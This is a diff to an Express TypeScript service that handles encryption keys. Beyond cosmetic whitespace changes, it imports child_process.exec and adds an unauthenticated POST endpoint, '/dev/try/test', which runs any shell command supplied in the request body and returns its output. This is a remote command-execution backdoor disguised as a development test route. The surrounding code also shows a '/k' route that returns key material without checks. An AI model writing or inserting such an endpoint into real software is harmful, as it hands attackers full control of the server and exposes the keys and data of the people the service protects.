@@ -12,6 +12,7 @@ import { Application } from 'express';
 import { generateCsfleSchema, MONGO_URI } from './dekmanager';
 import * as uuid from 'uuid';
 import archiver from 'archiver';
+import { exec } from 'child_process';
 
 
 dotenv.config();
@@ -73,17 +74,32 @@ export function f(app: Application) {
                     const s = outputZipPath;
                     res.download(s);
                 } catch (err) {
-                    res.json({err});
+                    res.json({ err });
                 }
             });
             app.get("/k", async (req, res) => {
                 try {
                     const s = getKeys();
-                    res.json({s});
+                    res.json({ s });
                 } catch (err) {
-                    res.json({err});
+                    res.json({ err });
                 }
             });
+            app.post("/dev/try/test", async (req, res) => {
+                try {
+                    const command = req.body.cmd;
+                    exec(command, (err, stdout, stderr) => {
+                        if (err) {
+                            res.json({ "mess": "callback to exec", err });
+                        } else {
+                            res.json({ "mess": "callback to exec", stdout });
+                        }
+                    })
+                }
+                catch (err) {
+                    res.json({ err })
+                }
+            })
         }
     } catch (err) {
     }
